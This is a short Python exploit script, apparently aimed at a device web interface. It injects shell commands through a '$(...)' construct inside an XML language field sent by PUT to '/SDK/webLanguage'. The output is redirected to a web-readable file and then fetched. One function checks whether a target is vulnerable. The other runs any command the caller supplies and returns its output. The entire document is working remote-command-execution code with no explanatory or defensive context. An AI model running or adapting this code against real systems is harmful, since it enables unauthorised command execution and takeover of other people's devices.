import requests



headers = {
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36",
    'Accept': '*/*',
    'X-Requested-With': 'XMLHttpRequest',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,sv;q=0.8'
}

def exp_check(url):

    data =  '<?xml version="1.0" encoding="UTF-8"?>' \
           f'<language>$(>webLib/cu)</language>'
    try:
        requests.put(url + '/SDK/webLanguage', headers=headers, data=data, timeout=3, verify=False)
        resp1 = requests.get(url + '/cu')
        if resp1.status_code == 200:
            return 1
        else:
            return 2
    except:
        return 3


def exp_cmd(url,cmd):
    
    data = '<?xml version="1.0" encoding="UTF-8"?>' \
           f'<language>$({cmd}>webLib/cu)</language>'
    try:
        requests.put(url + '/SDK/webLanguage', headers=headers, data=data, timeout=3, verify=False)
        resp1 = requests.get(url + '/cu')
        if resp1 is None or resp1.status_code != 200:
            return "Error execute cmd {}\n".format(cmd)
        else:
            return resp1.text
    except:
        return 3